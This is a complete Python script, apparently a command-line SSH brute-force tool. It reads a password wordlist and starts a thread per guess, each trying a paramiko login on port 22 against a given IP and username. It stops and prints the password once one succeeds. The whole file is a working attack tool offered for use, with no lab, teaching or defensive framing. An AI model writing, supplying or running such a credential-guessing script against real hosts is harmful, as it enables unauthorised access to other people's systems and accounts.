from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
from argparse import ArgumentParser
from threading import Thread
from time import perf_counter, sleep
from colorama import Fore
from typing import Tuple
from signal import raise_signal, SIGINT
from sys import stdout


def parse_arguments() -> Tuple[str, str, str, str, int]:
    parser = ArgumentParser()
    parser.add_argument('IP', help='target IP address')
    parser.add_argument('username', help='ssh username')
    parser.add_argument('wordlist', help='passwords wordlist')
    parser.add_argument('-v', '--verbose', help='verbose mode', action='store_true')
    parser.add_argument('-w', '--wait', help='waiting time (Default: 0.5s)', type=float, default=0.5)

    args = parser.parse_args()
    return args.IP, args.username, args.wordlist, args.verbose, args.wait


def check_password(password: str, code: int = 0) -> None:
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    if verbose:
        print(f'\r{Fore.GREEN}Trying: {password}{Fore.RESET}\t\t', end='')
    try:
        ssh.connect(target, port=22, username=username, password=password)
    except AuthenticationException:
        code = 1

    ssh.close()
    
    if code == 0: #! Correct Password
        print(f'{Fore.BLUE}password found: {Fore.RED}{password}{Fore.RESET}')
        raise_signal(SIGINT)


if __name__ == '__main__':
    try: 
        start = perf_counter()
        target, username, password_file, verbose, wait_time = parse_arguments()

        with open(password_file, 'r') as file:
            for line in file.readlines():
                passwd = line.strip()
                Thread(target=check_password, args=[passwd]).start()
                sleep(wait_time)
    except KeyboardInterrupt:
        pass


